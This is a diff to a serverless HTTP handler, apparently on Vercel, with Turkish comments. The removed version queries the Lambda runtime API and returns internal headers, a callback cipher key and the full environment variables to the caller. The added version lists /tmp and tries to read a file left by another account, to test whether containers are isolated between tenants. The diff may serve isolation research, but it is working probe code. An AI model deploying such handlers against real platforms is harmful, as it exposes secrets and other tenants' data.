@@ -1,20 +1,26 @@
+import fs from 'fs';
+
 export default async function handler(req, res) {
+  const hedefDosya = '/tmp/kanit_hesap_A.txt';
+  let sızıntıIcerigi = null;
+  let hataMesaji = null;
+  let mevcutTmp = [];
+
   try {
-    // 9001 portundan iç sistem bilgilerini çekiyoruz
-    const internalResponse = await fetch(`http://${process.env.AWS_LAMBDA_METADATA_API}/2018-06-01/runtime/invocation/next`, {
-      headers: { 'Lambda-Runtime-Invoker-Batch-Size': '1' }
-    });
+    // 1. Önce /tmp dizininde neler var bak (Başkasının izi var mı?)
+    mevcutTmp = fs.readdirSync('/tmp');
 
-    // Headers içindeki tüm gizli anahtarları yakala
-    const internalHeaders = Object.fromEntries(internalResponse.headers);
-
-    res.status(200).json({
-      mesaj: "Sistem basariyla dinlendi",
-      cipher_key: internalHeaders['response-callback-cipher-key'] || "Bulunamadi",
-      all_headers: internalHeaders,
-      env: process.env
-    });
-  } catch (error) {
-    res.status(200).json({ hata: error.message });
+    // 2. Ana hesabın bıraktığı dosyayı "çalmaya" çalış
+    sızıntıIcerigi = fs.readFileSync(hedefDosya, 'utf8');
+  } catch (e) {
+    hataMesaji = e.message;
   }
+
+  res.status(200).json({
+    durum: sızıntıIcerigi ? "🚨 KAPI KIRILDI! IZOLASYON YOK!" : "🛡️ Kilit şimdilik tutuyor",
+    bulunan_dosyalar: mevcutTmp,
+    sizdirilan_veri: sızıntıIcerigi,
+    hata_detayi: hataMesaji,
+    not: "Eğer listede kanit_hesap_A.txt yoksa, Vercel bizi farklı konteynırlara koymuş demektir."
+  });
 }
